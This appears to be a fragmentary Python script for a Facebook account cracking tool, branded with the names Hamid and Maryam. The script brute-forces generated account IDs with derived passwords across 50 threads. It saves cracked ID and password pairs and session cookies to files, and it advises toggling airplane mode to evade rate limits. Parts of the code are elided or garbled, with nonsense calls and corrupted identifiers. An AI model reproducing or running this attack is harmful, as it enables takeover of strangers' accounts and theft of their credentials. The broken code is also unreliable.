...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://youtu.be/bTUDUEUDzws')
        FD()
        return None
...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] FALLOW ME FECEBOOK')
    print(' [2] EXIT')
...
def o():
    ...
    if None == '0':
        os.system('exit')
        return None
    None('\n\x1b[1;31m  Choose vHamidd option\x1b[0;97m')
...
try:
    ...
    os.system('pip install mecMaryamze requests futures bs4==2 > /dev/null')
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invHamidd cookie'%(N,M,N))
...
\033[1;37m================= \33[32;45mHamid\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mHamid\33[0;m\033[1;32m && \033[1;33mMaryam\33[0;m
\033[1;32m     \033[1;35mREMEMBER      : \033[1;34m  😘ONLY JANI HO YAR😘
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mDream       :  \033[1;35m Tera piyar
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mMaryam\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO MY WORLD\33[0;m
 
\033[1;37m================== \33[32;45m💋maryam&Hamid💋\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;31m USE AIRPLANE MOOD IN EVERY 10 MINI')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'cache-control': 'no-cache, no-store, must-revHamiddate',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(Maryam-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Maryam-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(Maryam-CP😓•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/Maryam-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[Maryam] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
